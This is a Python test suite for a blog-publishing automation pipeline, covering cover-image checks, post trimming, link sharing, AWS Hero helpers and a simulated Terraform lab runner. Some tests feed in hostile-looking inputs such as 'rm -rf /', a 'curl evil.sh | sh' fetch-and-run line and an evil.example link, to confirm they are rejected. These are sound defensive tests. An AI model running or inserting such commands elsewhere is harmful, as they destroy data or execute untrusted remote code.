check("draft: early error -> comment shows the error", len(sent) == 1 and "cut off" in sent[0][2]["body"])
sent.clear(); (draft.OUT / "result.json").unlink()
draft.main()
check("draft: no result -> explanatory comment", len(sent) == 1 and sent[0][1].endswith("/issues/4/comments"))
shutil.rmtree(tmp)

# ---------- cover image, length, share ----------
import cover
EV = ("t+30s desired=0 running=0\n2026-10-19T14:30:00+00:00  LiveTaskCount=4.0  RunningTaskCount=1.0\n"
      "2026-10-19T14:31:00+00:00  LiveTaskCount=4.0  RunningTaskCount=1.0\n"
      "2026-10-19T14:29:00+00:00  LiveTaskCount=4.0  RunningTaskCount=4.0\n14:31:10 DEACTIVATING=3 RUNNING=1\n")
ch = {"kind": "chart", "alt": "a", "chart": {"title": "t", "x": ["14:29", "14:30", "14:31"],
      "series": [{"name": "LiveTaskCount", "values": [4, 4, 4]}, {"name": "RunningTaskCount", "values": [4, 1, 1]}]}}
check("cover: chart whose numbers are in the logs passes", (cover.verify(ch, EV) or {}).get("kind") == "chart")
ch["chart"]["series"][1]["values"] = [4, 1, 3]
check("cover: a number not printed next to its name is refused (3 elsewhere on a 14:31 line)", cover.verify(ch, EV) is None)
t = cover.verify({"kind": "terminal", "alt": "a", "lines": ["t+30s   desired=0 running=0", "made up", "token=abc",
                  "14:31:10 DEACTIVATING=3 RUNNING=1"], "highlight": [3]}, EV + "token=abc\n")
check("cover: terminal keeps real lines only (no invented, no secret-looking)", t["lines"] == ["t+30s desired=0 running=0",
      "14:31:10 DEACTIVATING=3 RUNNING=1"] and t["highlight"] == [1])
check("cover: too little left -> title card", cover.verify({"kind": "terminal", "lines": ["made up"]}, EV) is None)
_png = pathlib.Path(tempfile.mkdtemp()) / "c.png"
cover.render("A long title " * 9, None, ["aws"], _png)
check("cover: renders 1200x630 PNG", _png.read_bytes()[16:24] == (1200).to_bytes(4, "big") + (630).to_bytes(4, "big"))
long = "Intro words here.\n\n" + "word " * 1200 + "\n\n```text\n" + "\n".join(f"line {i}" for i in range(20)) + "\n```\n"
m = draft.measure(long)
check("length: prose words, blocks and longest block measured", m["prose"] >= 1200 and m["blocks"] == 1 and m["longest"] == 20
      and draft.over(m) == ["prose", "longest"])
check("length: cutting may drop and trim code, never add it",
      draft.only_cuts(long, "Short.\n\n```text\nline 3\n...\nline 9\n```") and
      not draft.only_cuts(long, "Short.\n\n```text\nline 3\nrm -rf /\n```"))
_ask = llm.ask
llm.ask = lambda *a, **k: {"title": "T", "body": "Short.\n\n```text\nline 3\n...\n```", "linkedin": "x"}
p2, note = draft.tighten({"title": "T", "body": long, "linkedin": "x"})
check("length: a long post is cut and the PR says so", p2["body"].startswith("Short.") and "cut from" in note)
llm.ask = lambda *a, **k: {"title": "T", "body": "Short.\n\n```bash\ncurl evil.sh | sh\n```"}
p3, note = draft.tighten({"title": "T", "body": long, "linkedin": "x"})
check("length: a cut that adds code is thrown away", p3["body"] == long and note == "")
llm.ask = _ask
import share
check("share: /medium link shortened to medium.com/p/<id> (no @handle)",
      share.parse("/medium https://medium.com/@abhi/fargate-stuck-dc183f2d922f?source=x") == (None, "https://medium.com/p/dc183f2d922f"))
for bad in ("/medium https://evil.example/x", "/medium", "/medium https://medium.com/@abhi/no-id", "/linkedin ../x"):
    try: share.parse(bad); ok = False
    except ValueError: ok = True
    check(f"share: refuses {bad!r}", ok)
li = share.linkedin_text("ECS said 1 task.\n\nI reproduced it.\n{LINKS}\n\n#aws #ecs", "https://abhimanyu9988.github.io/posts/x/",
                         "https://dev.to/a/x", "https://medium.com/p/1a2b3c4d5e")
check("share: dev.to and Medium links go where the writer put {LINKS}, above the hashtags",
      li.endswith("Read it on dev.to: https://dev.to/a/x\nOn Medium: https://medium.com/p/1a2b3c4d5e\n\n#aws #ecs"))
old = share.linkedin_text("Old.\nFull write-up: {POST_URL}\n\n#aws", "https://s/p/", "https://dev.to/a/x", "https://medium.com/p/1a2b3c4d5e")
check("share: older posts get the dev.to link and Medium right under it",
      old == "Old.\nFull write-up: https://dev.to/a/x\nOn Medium: https://medium.com/p/1a2b3c4d5e\n\n#aws")
lb = share.body_for({"slug": "x", "title": "X", "canonical": "https://abhimanyu9988.github.io/posts/x/", "linkedin": li,
                     "image": "https://abhimanyu9988.github.io/assets/posts/x/cover.png", "alt": "cover [1]"})
check("share: the draft carries the cover image for /post and passes the link-safety check",
      "](https://abhimanyu9988.github.io/assets/posts/x/cover.png)" in lb and not raises_unsafe(lb))
meta = {"image": "/assets/posts/x/cover.png"}
body = "![c](https://abhimanyu9988.github.io/assets/posts/x/cover.png)\n\nHello"
own = "**[Open your LinkedIn draft](https://github.com/Abhimanyu9988/Abhimanyu9988/issues/4)**, comment /post there."
check("own links: a link to an issue in his own repos is allowed only where asked for",
      not raises_unsafe_own(own) and raises_unsafe(own))
for bad in ("https://github.com/aws/karpenter/issues/4", "https://github.com/Abhimanyu9988/Abhimanyu9988/issues/4/x",
            "https://github.com/Abhimanyu9988/Abhimanyu9988/issues/4 and @bob", "see aws/x#5 https://github.com/Abhimanyu9988/Abhimanyu9988/issues/4"):
    check(f"own links: still refused: {bad[:50]!r}", raises_unsafe_own(bad))
import medium_pages
check("medium: tables become aligned text (Medium has no tables)",
      medium_pages.tables_as_text("x\n\n| A | B |\n| --- | --- |\n| `a1` | b |\n\ny") == "x\n\n```text\nA   B\na1  b\n```\n\ny")
check("publish: dev.to gets the cover as main_image and not twice in the body",
      publish.without_cover(body, meta) == "Hello" and publish.cover_url(meta).endswith("/assets/posts/x/cover.png")
      and publish.without_cover(body, {}) == body)

# ---------- AWS Hero helpers ----------
import hero
tmp = tempfile.mkdtemp(); os.chdir(tmp)
pathlib.Path("site/_posts").mkdir(parents=True)
pathlib.Path("site/_posts/2026-10-18-why-ecs.md").write_text('---\ntitle: "Why ECS stays at zero"\ndescription: "d"\n---\nBody text.\n')
check("hero: posts read from front matter", hero.posts()[0]["title"] == "Why ECS stays at zero"
      and hero.posts()[0]["url"].endswith("/posts/why-ecs/"))
hero.fetch = lambda url: "<html><button>Join the waitlist</button></html>"
check("hero: waitlist detected", hero.cb_status() == "waitlist")
hero.fetch = lambda url: "<html>Applications are now open. Apply now</html>"
check("hero: open detected", hero.cb_status() == "open")
opened, wrote = [], []
hero.post_issue = lambda t, b, l: opened.append((t, b, l)) or {"number": 1}
hero.ensure_label = lambda l: None
hero.analytics.read_file = lambda path, ref="analytics": ("{}", None)
hero.analytics.ensure_branch = lambda: None
hero.analytics.write_file = lambda path, text, sha, msg: wrote.append(json.loads(text))
hero.analytics.load_ledger = lambda: ([], None)
hero.watch()
check("hero: opening applications triggers one hero-goal issue with the application kit",
      len(opened) == 1 and opened[0][2] == "hero-goal" and "Why ECS stays at zero" in opened[0][1]
      and wrote[-1]["cb_status"] == "open")
hero.analytics.read_file = lambda path, ref="analytics": (json.dumps({"cb_status": "open"}), "s")
opened.clear(); hero.watch()
check("hero: no repeat alert while it stays open (outside January)", opened == [] or hero.NOW.month == 1)
replies_c = []
hero.comment = lambda n, b: replies_c.append(b)
hero.question_text = lambda url: "How do I scale ECS from zero with SQS?"
hero.llm.ask = lambda *a, **k: {"reply": "I hit this. Thanks @bob, see aws/x#5. I reproduced this here: "
                                 "https://abhimanyu9988.github.io/posts/why-ecs/", "uses_post": ""}
hero.llm.refine = lambda kind, d, *a, **k: (d, {"points": []})
os.environ.update(ISSUE="7", COMMENT_BODY="/reply https://stackoverflow.com/questions/123/x please keep it short")
hero.reply()
check("hero /reply: draft comment, SO rule, no live mentions or refs",
      len(replies_c) == 1 and "own words" in replies_c[0] and "@bob" not in replies_c[0] and "aws/x#5" not in replies_c[0]
      and "abhimanyu9988.github.io/posts/why-ecs/" in replies_c[0])
os.environ["COMMENT_BODY"] = "/reply not-a-link"; replies_c.clear(); hero.reply()
check("hero /reply: usage help on a bad command", "Usage" in replies_c[0])
def kit_ask(who, system, prompt, schema, tool="submit", tier="write"):
    if "talk" in prompt.lower() and "10-minute" in prompt:
        return {"title": "Scaling from zero", "abstract": "a", "audience": "devs", "cfp_short": "c",
                "outline": [{"minutes": 3, "part": "Hook", "what": "w"}], "demo": ["terraform apply"], "takeaways": ["t"]}
    return {"title": "ECS from zero", "goals": ["g"], "prerequisites": ["p"], "cost_note": "destroy it", "hands_on": ["h"],
            "agenda": [{"minutes": 10, "part": "Intro", "what": "w"}], "discussion": ["d"], "feedback_questions": ["f"],
            "quiz": [{"q": "Why?", "options": ["a", "b"], "answer": "a"}]}
hero.llm.ask = kit_ask
hero.llm.refine = lambda kind, d, *a, **k: (d, {"points": []})
opened.clear(); hero.monthly()
check("hero monthly: talk kit and student session issues, each with the /stats hint",
      [o[2] for o in opened] == ["talk-kit", "teaching"] and all("/stats why-ecs" in o[1] for o in opened)
      and "Answer: a" in opened[1][1])
os.chdir("/"); shutil.rmtree(tmp)

# ---------- Medium-ready pages ----------
try:
    import medium_pages
    mt = tempfile.mkdtemp()
    pathlib.Path(mt, "posts").mkdir()
    pathlib.Path(mt, "posts", "2026-10-18-why-ecs.md").write_text(
        '---\ntitle: "Why ECS > zero"\ndescription: "d"\n---\nIntro.\n\n1. Get the lab.\n\n```bash\ngit clone x\n```\n\n'
        '2. Apply it.\n\n```text\nApply complete!\n```\n\n## Sources\n\n- [SO question](https://stackoverflow.com/q/1)\n')
    medium_pages.build(f"{mt}/posts", f"{mt}/out")
    page = pathlib.Path(mt, "out", "why-ecs", "index.html").read_text()
    check("medium page: plain code blocks, Step headings, canonical to the real post, noindex, links kept",
          page.count("<pre><code>") == 2 and "<h3>Step 1: Get the lab</h3>" in page and "<h3>Step 2: Apply it</h3>" in page
          and 'rel="canonical" href="https://abhimanyu9988.github.io/posts/why-ecs/"' in page and "noindex" in page
          and 'href="https://stackoverflow.com/q/1"' in page and "Why ECS &gt; zero" in page)
    shutil.rmtree(mt)
except ImportError:
    print("SKIP medium page test (python-markdown not installed)")

# ---------- lab runner end to end, simulated (no AWS, no docker) ----------
LAB_PROMPTS = []
def simulate(plans, repros, fixes, attempts=3, label="problem"):
    """plans/repros/fixes: per-attempt outcomes. Returns (result, destroy calls)."""
    tmp = tempfile.mkdtemp(); os.chdir(tmp)
    lab.OUT, lab.WORK, lab.GOOD, lab.TFCACHE = pathlib.Path("out"), pathlib.Path("work/lab"), pathlib.Path("work/good"), pathlib.Path("work/.tfcache")
    lab.EVIDENCE.clear(); lab.MAX_ATTEMPTS = attempts; lab.DRY = False; lab.BUCKET = "b"
    n = {"plan": 0, "repro": 0, "fix": 0, "lab": 0}; destroys = []
    def mk():
        n["lab"] += 1
        return {"summary": f"v{n['lab']}", "expected": "", "files": [{"path": f, "content": f"v{n['lab']}"} for f in lab.REQUIRED]}
    llm.claude_json = lambda *a, **k: (LAB_PROMPTS.append(a[0] + "\n" + a[1]) or mk())
    llm.refine = lambda kind, d, *a, **k: (d, {"approved": True, "reviewer": "ChatGPT", "points": []})
    def fake_run(step, cmd, timeout, cwd=None, env=None, record=True, sandbox=False):
        c = " ".join(cmd)
        if "terraform plan" in c:
            ok = plans[n["plan"]]; n["plan"] += 1; return (0, "planned") if ok else (1, "Error: invalid HCL")
        if "terraform show" in c: return 0, '{"resource_changes": []}'
        if "reproduce.sh" in c:
            r_ = repros[n["repro"]]; n["repro"] += 1; return 0, f"HERO_RESULT: {r_}"
        if "fix.sh" in c:
            f_ = fixes[n["fix"]]; n["fix"] += 1; return 0, f"HERO_RESULT: {f_}"
        if "terraform destroy" in c:
            destroys.append((pathlib.Path(cwd) / "main.tf").read_text()); return 0, ""
        if "sts" in c: return 0, "300054528837"
        if "list-objects-v2" in c: return 0, "[]"
        if cmd[0] == "aws" and "--output" in cmd: return 0, "{}"
        return 0, ""
    lab.run, lab.s3 = fake_run, (lambda *a: (0, ""))
    def gh_issue(m, u, b=None, h=None, timeout=30):
        return {"title": "Why ECS tasks stay PENDING", "body": "x", "labels": [{"name": l} for l in label.split(",")]}
    r._send = gh_issue
    lab.main()
    res = json.loads((lab.OUT / "result.json").read_text())
    res["_topic"] = json.loads((lab.OUT / "topic.json").read_text())
    os.chdir("/"); shutil.rmtree(tmp)
    return res, destroys

res, d = simulate([True], ["reproduced"], ["fixed"])
check("lab sim: happy path -> reproduced_and_fixed, destroyed once", res["status"] == "reproduced_and_fixed" and res["destroyed"] and len(d) == 1)
res, d = simulate([True, False], ["not_reproduced"], [], attempts=2)
check("lab sim: broken revision -> destroy uses the last config that planned (v1, not v2)", d == ["v1"] and res["destroyed"])
check("lab sim: last failure recorded", res["last_failure"]["step"] == "plan" and res["status"] == "failed")
res, d = simulate([True, False, True], ["not_reproduced", "reproduced"], ["fixed"])
check("lab sim: recovers on attempt 3 and destroys v3", res["status"] == "reproduced_and_fixed" and res["attempts"] == 3 and d == ["v3"])
res, d = simulate([False, False, False], [], [])
check("lab sim: nothing ever planned -> nothing to destroy", res["destroyed"] is True and d == [])
LAB_PROMPTS.clear()
res, d = simulate([True], ["reproduced"], ["fixed"], label="radar,build")
check("build topic: the lab is told to show the before-state and prove the build, and topic.json says build",
      res["_topic"]["kind"] == "build" and "THIS IS A BUILD TOPIC" in LAB_PROMPTS[0] and "prove it works" in LAB_PROMPTS[0])
LAB_PROMPTS.clear()
res, d = simulate([True], ["reproduced"], ["fixed"])
check("problem topic: no build rules", res["_topic"]["kind"] == "problem" and "BUILD TOPIC" not in LAB_PROMPTS[0])
# ---------- monthly open-source summary ----------
import monthly
tmp = tempfile.mkdtemp(); os.chdir(tmp); monthly.OUT = pathlib.Path("out")
msent = []
def m_send(m, u, b=None, h=None, timeout=30):
    path = u.replace("https://api.github.com", "")
    if m != "GET":
        msent.append((m, path, b)); return {"number": 50}
    if path.startswith("/search/issues"):
        q = urllib.parse.unquote(path)
        if "is:open" in q: return {"items": []}
        if "is:pr" in q:   # GitHub's quirk: issues only
            return {"items": [{"number": 7, "repository_url": "https://api.github.com/repos/open-telemetry/x"}]}
        return {"items": [{"number": 4158, "repository_url": "https://api.github.com/repos/open-telemetry/semantic-conventions",
                           "pull_request": {}}, {"number": 7, "repository_url": "https://api.github.com/repos/open-telemetry/x"}]}
    if "/pulls/4158" in path:
        return {"number": 4158, "title": "[k8s] Add Pod level memory limit and request metrics", "merged_at": "2026-10-20T10:00:00Z",
                "html_url": "https://github.com/open-telemetry/semantic-conventions/pull/4158", "body": "Fixes #3990",
                "additions": 120, "deletions": 4, "changed_files": 6}
    if path.endswith("/issues/3990"):
        return {"title": "Add memory limit metrics", "html_url": "https://github.com/open-telemetry/semantic-conventions/issues/3990",
                "reactions": {"+1": 12}, "comments": 9}
    if "/releases" in path:
        return [{"name": "v1.39.0", "tag_name": "v1.39.0", "published_at": "2026-10-25T00:00:00Z", "body": "- add pod memory (#4158)",
                 "html_url": "https://github.com/open-telemetry/semantic-conventions/releases/tag/v1.39.0"}]
    if path.endswith("/git/ref/heads/main"): return {"object": {"sha": "abc"}}
    if "/git/ref/heads/draft/" in path: raise RuntimeError("HTTP 404")
    return {"description": "Semantic conventions", "stargazers_count": 400}
import urllib.parse
r._send = m_send
os.environ["MONTH"] = "2026-10"
prs, rev = monthly.collect(*monthly.month_range())
check("monthly: finds merged PRs even when GitHub answers is:pr with issues; keeps PRs only",
      [p["number"] for p in prs] == [4158] and prs[0]["closes"][0]["thumbs_up"] == 12)
check("monthly: finds the release that ships the PR", prs[0]["released_in"]["name"] == "v1.39.0")
real_ask2 = llm.ask
llm.ask = lambda *a, **k: {"title": "October 2026: Kubernetes memory metrics land in OTel", "description": "d",
                           "tags": ["opensource", "opentelemetry"], "body": "Opening.\n\n> **TL;DR**\n> - x",
                           "linkedin": "Hook\n{LINKS}\n#opentelemetry", "source_replies": []}
real_ref = llm.refine
llm.refine = lambda kind, d, *a, **k: (d, {"approved": True, "reviewer": "Claude", "points": []})
real_lr = draft.linkedin_round; draft.linkedin_round = lambda p, k: (p, None)
monthly.main()
llm.ask, llm.refine, draft.linkedin_round = real_ask2, real_ref, real_lr
mpr = next((b for m, p_, b in msent if p_.endswith("/pulls")), None)
mputs = [p_ for m, p_, b in msent if m == "PUT"]
check("monthly: draft PR with the post, a cover, the PR list and a redraft marker",
      mpr and "<!-- monthly: 2026-10 -->" in mpr["body"] and "released in v1.39.0" in mpr["body"]
      and any(p_.endswith("open-source-summary-2026-10.md") for p_ in mputs)
      and any(p_.endswith("/open-source-summary-2026-10/cover.png") for p_ in mputs)
      and "Closes" not in mpr["body"])
os.environ.pop("MONTH"); os.chdir("/"); shutil.rmtree(tmp)
print("\nALL PASSED" if not fails else f"\n{fails} FAILED"); sys.exit(1 if fails else 0)
